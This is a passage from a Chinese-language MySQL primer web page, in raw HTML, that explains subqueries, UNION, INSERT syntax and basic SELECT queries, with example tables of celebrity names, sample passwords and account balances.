class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>  <span class="token operator">|</span>   <span class="token number">5</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> iphone 键盘   <span class="token operator">|</span>  <span class="token number">12123413</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="9-4-子查询"><font color="#3CB371" face="Comic sans MS">9.4 子查询</font><a href="post/MySQL-Primer#9-4-子查询"></a></h4><p>有时候，当我们查询的时候，需要的条件是另外一个select语句的结果，这时就需要使用子查询。<br>用于子查询的关键字包括<font color="#FF7F00"><strong>in、not in、=、!=、exists、not exists</strong></font>等。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段  from 表 where 字段 in(条件)</td></tr><tr><td align="center">示例1</td><td align="left">select *  from user where uid in (1,3,4);</td></tr><tr><td align="center">示例1说明</td><td align="left">按照id 查询指定用户</td></tr><tr><td align="center">示例2</td><td align="left">select *  from user where uid in (select uid from order_goods);</td></tr><tr><td align="center">示例2说明</td><td align="left">将购买过商品的用户信息显示出来</td></tr></tbody></table></div></div><p>&emsp;<br>示例1：</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span>  from user where uid <span class="token function">in</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> uid <span class="token operator">|</span> username  <span class="token operator">|</span> password <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span> 景甜      <span class="token operator">|</span> <span class="token number">123456</span>   <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>  <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span> <span class="token number">123455</span>   <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token number">3</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>示例2：</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span>  from user where uid <span class="token function">in</span> <span class="token punctuation">(</span>select uid from order_goods<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span> uid <span class="token operator">|</span> username  <span class="token operator">|</span> password <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> 高小峰    <span class="token operator">|</span> 3124qwqw <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span> <span class="token number">1235531</span>  <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> 李小超    <span class="token operator">|</span> 311aqqee <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span> 佟小刚    <span class="token operator">|</span> 3cxvdfs  <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span> <span class="token number">4</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> select <span class="token operator">*</span> from emp where deptno <span class="token function">in</span> <span class="token punctuation">(</span>select deptno from dept<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="9-5-记录联合"><font color="#3CB371" face="Comic sans MS">9.5 记录联合</font><a href="post/MySQL-Primer#9-5-记录联合"></a></h4><p>使用 union 和 union all 关键字，将两个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示。两者主要的区别是把结果直接合并在一起，而 union 是将 union all 后的结果进行一次distinct，去除重复记录后的结果。<br>关键字包括<font color="#FF7F00"><strong>union、union all、distinct</strong></font>等。</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select语句1 union[all] select语句2</td></tr><tr><td align="center">示例</td><td align="left">select *  from user where uid in (1,3,4);</td></tr><tr><td align="center">示例说明</td><td align="left">将商品表中的用户信息和用户表中的用户信息的结果组合在一起</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select uid from user union select uid from order_goods<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> uid <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">2</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">3</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">4</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">5</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">6</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">7</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">8</span> <span class="token operator">|</span> <span class="token operator">|</span>   <span class="token number">9</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">10</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">11</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">12</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">13</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">14</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token number">15</span> <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">15</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="十-增删改查之插入记录"><font color="#FF6347" face="Comic sans MS">十. 增删改查之插入记录</font><a href="post/MySQL-Primer#十-增删改查之插入记录"></a></h3><p>插入记录有两种个基本语法。</p><p>&emsp;<br>插入基本语法一</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">insert into 表 values(值1,值2,值n);</td></tr><tr><td align="center">示例</td><td align="left">INSERT INTO user values(2,’php中文网’,’男’)</td></tr><tr><td align="center">示例说明</td><td align="left">向user表中插入值id为2，姓名为李文凯，性别为男</td></tr></tbody></table></div></div><p>&emsp;<br>插入基本语法二</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">insert into 表(字段1,字段2,字段n) values(值1,值2,值n);</td></tr><tr><td align="center">示例</td><td align="left">INSERT INTO user(id,username,sex) values(213,’小沈阳’,1);</td></tr><tr><td align="center">示例说明</td><td align="left">向user表中插入id为213，username为小沈阳，性别为1</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>基本语法1和基本语法2的区别是：</strong></font></p><ol><li>基本语法1的插入语句，表中有多少个字段就必须要插入多少个值。一个不能多，一个也不能少。若有默认值，不想传，可以写上null。</li><li>基本语法2中，除非有必填字段必须要写入值外。如果有默认值的不想写可以忽略不写。mysql会自动补主默认值。</li><li>基本语法2中，以user(id,username,sex)字段顺序为值的顺序。</li></ol></blockquote><p>&emsp;<br>&emsp;<br>&emsp;<br>假设有一张表为user表，我们对字段、字段说明、类型和字段选填和必须状态进行说明，表结构如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">字段</th><th align="left">id</th><th align="left">username</th><th align="left">email</th><th align="left">password</th><th align="left">sex</th></tr></thead><tbody><tr><td align="center"><strong>中文说明</strong></td><td align="left">编号</td><td align="left">用户名</td><td align="left">邮箱</td><td align="left">密码</td><td align="left">性别</td></tr><tr><td align="center"><strong>类型说明</strong></td><td align="left">int</td><td align="left">varchar(50)</td><td align="left">varchar(60)</td><td align="left">varchar(32)</td><td align="left">tinyint</td></tr><tr><td align="center"><strong>默认值说明</strong></td><td align="left">自增</td><td align="left">必填</td><td align="left">选填字段，默认值为<a href="mailto:123@php.cn" target="_blank" rel="noopener">123@php.cn</a></td><td align="left">选填字段</td><td align="left">必填字段</td></tr></tbody></table></div></div><p>&emsp;<br>按照基本语法一写上表中的插入语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">INSERT</span> <span class="token constant">INTO</span> user <span class="token function">values</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token string">'php中文网'</span><span class="token punctuation">,</span><span class="token string">'pig@php.cn'</span><span class="token punctuation">,</span><span class="token keyword">null</span> <span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>可以不指定字段名称，但是 values 后面的顺序应该和表字段的排序一致。</li><li>有默认值的字段可以不写，则为默认值。</li><li>如果有默认值或者可空字段不想传入具体值，可写入null。<br>数据格式必须要与表规定的数据格式一致。</li></ol></blockquote><p>&emsp;<br>按照基本语法二写上表中的插入语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token function">user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>sex<span class="token punctuation">)</span> <span class="token function">values</span><span class="token punctuation">(</span><span class="token string">'php中文网'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>ID为自增的自段可以不用传入值，每插入一次这个字段的值会自动向上加1。</li><li>有默认值和可为空的字段可不传</li><li>以表user(username,sex)的插入顺序为准</li><li><font color="#FF7F00"><strong>基本语法二为更常用的用法</strong></font></li></ol></blockquote><p>&emsp;<br><font color="red"><strong>基本语法变形：一次插入多条记录</strong></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token function">user</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">,</span>sex<span class="token punctuation">)</span> <span class="token function">values</span><span class="token punctuation">(</span><span class="token string">'胡歌'</span><span class="token punctuation">,</span> <span class="token string">'abcdef'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token string">'霍建华'</span><span class="token punctuation">,</span> <span class="token string">'bcdeef'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token string">'张靓颖'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'刘诗诗'</span><span class="token punctuation">,</span> <span class="token string">'987654'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="十一-增删改查之查询记录"><font color="#FF6347" face="Comic sans MS">十一. 增删改查之查询记录</font><a href="post/MySQL-Primer#十一-增删改查之查询记录"></a></h3><p>下面定义了一个表结构，表名为money，表中存放着银行的余额和用户的基本信息。</p><p><font color="#00B2EE">[<a href="http://www.php.cn/code/4968.html" target="_blank" rel="noopener">视频教程</a>]</font></p><p>&emsp;<br>创建表的语句如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token function">money</span> <span class="token punctuation">(</span>     id <span class="token constant">INT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token constant">AUTO_INCREMENT</span> <span class="token punctuation">,</span>     username <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>     balance <span class="token constant">FLOAT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      province <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      age <span class="token constant">TINYINT</span> <span class="token constant">UNSIGNED</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      sex <span class="token constant">TINYINT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      <span class="token constant">PRIMARY</span> <span class="token function">KEY</span> <span class="token punctuation">(</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">)</span> <span class="token constant">ENGINE</span> <span class="token operator">=</span> InnoDB <span class="token constant">CHARACTER</span> <span class="token constant">SET</span> utf8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>表结构和数据展示如下：(注：balance是指余额、province是指省份)</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">id</th><th align="left">username</th><th align="left">balance</th><th align="left">province</th><th align="left">age</th><th align="left">sex</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">王宝强</td><td align="left">120.02</td><td align="left">上海</td><td align="left">29</td><td align="left">1</td></tr><tr><td align="center">2</td><td align="left">范冰冰</td><td align="left">260.23</td><td align="left">山东</td><td align="left">40</td><td align="left">0</td></tr><tr><td align="center">3</td><td align="left">黄晓明</td><td align="left">150.86</td><td align="left">山东</td><td align="left">40</td><td align="left">1</td></tr><tr><td align="center">4</td><td align="left">井柏然</td><td align="left">810</td><td align="left">辽宁</td><td align="left">27</td><td align="left">1</td></tr><tr><td align="center">5</td><td align="left">李冰冰</td><td align="left">20.15</td><td align="left">黑龙江</td><td align="left">43</td><td align="left">0</td></tr><tr><td align="center">6</td><td align="left">成龙</td><td align="left">313</td><td align="left">山东</td><td align="left">63</td><td align="left">1</td></tr><tr><td align="center">7</td><td align="left">杨幂</td><td align="left">123</td><td align="left">北京</td><td align="left">30</td><td align="left">0</td></tr><tr><td align="center">8</td><td align="left">刘诗诗</td><td align="left">456</td><td align="left">北京</td><td align="left">29</td><td align="left">1</td></tr><tr><td align="center">9</td><td align="left">柳岩</td><td align="left">23.4</td><td align="left">湖南</td><td align="left">36</td><td align="left">0</td></tr><tr><td align="center">10</td><td align="left">赵本山</td><td align="left">3456</td><td align="left">辽宁</td><td align="left">63</td><td align="left">1</td></tr><tr><td align="center">11</td><td align="left">汪峰</td><td align="left">34.32</td><td align="left">北京</td><td align="left">44</td><td align="left">1</td></tr><tr><td align="center">12</td><td align="left">郭德纲</td><td align="left">212</td><td align="left">天津</td><td align="left">43</td><td align="left">1</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="11-1-基础查询"><font color="#3CB371" face="Comic sans MS">11.1 基础查询</font><a href="post/MySQL-Primer#11-1-基础查询"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select * from 表;</td></tr><tr><td align="center">示例</td><td align="left">select * from money;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中所有字段中的所有结果</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注：” * ” 是一种正则表达式的写法，表示匹配所有，上面的查询语句和下面的是等价：</strong></font></p></blockquote><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select <span class="token operator">*</span> from money<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span> province  <span class="token operator">|</span> age <span class="token operator">|</span> sex <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span> 湖北      <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span>  <span class="token number">40</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span>  <span class="token number">40</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span> 辽宁      <span class="token operator">|</span>  <span class="token number">27</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span> 黑龙江    <span class="token operator">|</span>  <span class="token number">43</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span> 山东      <span class="token operator">|</span>  <span class="token number">63</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> 杨幂      <span class="token operator">|</span>     <span class="token number">123</span> <span class="token operator">|</span> 北京      <span class="token operator">|</span>  <span class="token number">30</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span> 北京      <span class="token operator">|</span>  <span class="token number">29</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> 柳岩      <span class="token operator">|</span>    <span class="token number">23.4</span> <span class="token operator">|</span> 湖南      <span class="token operator">|</span>  <span class="token number">36</span> <span class="token operator">|</span>   <span class="token number">0</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> 赵本山    <span class="token operator">|</span>    <span class="token number">3456</span> <span class="token operator">|</span> 辽宁      <span class="token operator">|</span>  <span class="token number">63</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> 汪峰      <span class="token operator">|</span>   <span class="token number">34.32</span> <span class="token operator">|</span> 北京      <span class="token operator">|</span>  <span class="token number">44</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> 郭德纲    <span class="token operator">|</span>     <span class="token number">212</span> <span class="token operator">|</span> 天津      <span class="token operator">|</span>  <span class="token number">43</span> <span class="token operator">|</span>   <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">12</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="11-2-指定字段查询"><font color="#3CB371" face="Comic sans MS">11.2 指定字段查询</font><a href="post/MySQL-Primer#11-2-指定字段查询"></a></h4><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">select 字段 from 表;</td></tr><tr><td align="center">示例</td><td align="left">select id,username, balance from money;</td></tr><tr><td align="center">示例说明</td><td align="left">查询money表中id,username, balance字段中的所有结果</td></tr></tbody></table></div></div><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> select id<span class="token punctuation">,</span>username<span class="token punctuation">,</span> balance from money<span class="token punctuation">;</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span> id <span class="token operator">|</span> username  <span class="token operator">|</span> balance <span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> 王宝强    <span class="token operator">|</span>  <span class="token number">120.02</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> 范冰冰    <span class="token operator">|</span>  <span class="token number">260.23</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> 黄晓明    <span class="token operator">|</span>  <span class="token number">150.86</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">4</span> <span class="token operator">|</span> 井柏然    <span class="token operator">|</span>     <span class="token number">810</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">5</span> <span class="token operator">|</span> 李冰冰    <span class="token operator">|</span>   <span class="token number">20.15</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">6</span> <span class="token operator">|</span> 成龙      <span class="token operator">|</span>     <span class="token number">313</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">7</span> <span class="token operator">|</span> 杨幂      <span class="token operator">|</span>     <span class="token number">123</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> 刘诗诗    <span class="token operator">|</span>     <span class="token number">456</span> <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">9</span> <span class="token operator">|</span> 柳岩      <span class="token operator">|</span>    <span class="token number">23.4</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">10</span> <span class="token operator">|</span> 赵本山    <span class="token operator">|</span>    <span class="token number">3456</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">11</span> <span class="token operator">|</span> 汪峰      <span class="token operator">|</span>   <span class="token number">34.32</span> <span class="token operator">|</span><span class="token 